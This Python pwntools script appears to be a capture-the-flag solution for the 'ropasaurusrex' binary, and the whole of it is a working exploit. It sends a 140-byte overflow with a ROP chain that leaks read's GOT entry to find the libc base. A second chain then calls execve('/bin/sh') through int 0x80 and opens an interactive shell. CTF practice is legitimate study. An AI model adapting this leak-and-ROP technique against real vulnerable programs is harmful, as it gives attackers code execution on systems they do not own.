from pwn import *

p = process("./ropasaurusrex")

#gdb.attach(p, "break *0x0804841C\nc")

write_func = p32(0x08048442)

leak_ptr = p32(0x0804961C) # address of read in GOT, has a pointer to libc.
pop_ebp = p32(0x08048453) # gadget to pop ebp
new_ebp = p32(0x08049354) # this addr + 4 points to main. causes us to call main again after we get our leak

# write(1, leak_ptr, 4) - writes 4 bytes at leak_ptr to stdout
write_call = write_func + p32(1) + leak_ptr + p32(4)

p.sendline("A"*140 + pop_ebp + new_ebp + write_call)

# get leak
leak = u32(p.recv())

libc_base = leak - 0xd5af0

#gadgets
pop_eax = libc_base + 0x0002406e
pop_ebx = libc_base + 0x18395
pop_ecx = libc_base + 0x000b5377
pop_edx = libc_base + 0x00001aa6
int_80 = libc_base + 0x00002c87

# ptr to a /bin/sh string in libc
bin_sh_ptr = libc_base + 0x15b9ab

# send rop chain
p.sendline("A"*140 + p32(pop_eax) + p32(0xb) + p32(pop_ebx) + p32(bin_sh_ptr) + p32(pop_ecx) + p32(0) + p32(pop_edx) + p32(0) + p32(int_80))

# get shell :-)
p.interactive()
